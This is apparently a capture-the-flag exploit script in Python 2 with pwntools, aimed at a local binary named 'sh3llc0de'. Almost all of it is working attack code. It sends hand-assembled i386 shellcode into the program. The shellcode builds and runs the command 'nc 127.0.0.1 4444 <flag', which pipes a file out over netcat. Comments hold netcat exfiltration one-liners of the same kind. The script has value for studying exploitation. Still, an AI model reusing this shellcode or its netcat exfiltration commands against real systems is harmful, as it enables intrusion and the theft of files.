#!/usr/bin/env python2
from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'
r = process('./sh3llc0de')

#gdb.attach(r, '''
#break *0x08048544
#c
#''')

shellcode = asm(shellcraft.i386.linux.sh())
#cat flag | nc 127.0.0.1 4444
#nc 127.0.0.1 4444 <flag
shellcode="\x68\x6C\x61\x67\x20\x68\x34\x20\x3C\x66\x68\x20\x34\x34\x34\x68\x2E\x30\x2E\x31\x68\x32\x37\x2E\x30\x68\x6E\x63\x20\x31\x54\xB8\x3F\x82\x04\x08\x66\x05\x01\x01\xFF\xD0"

r.sendline(shellcode)
#r.recv(1024)
#r.interactive()


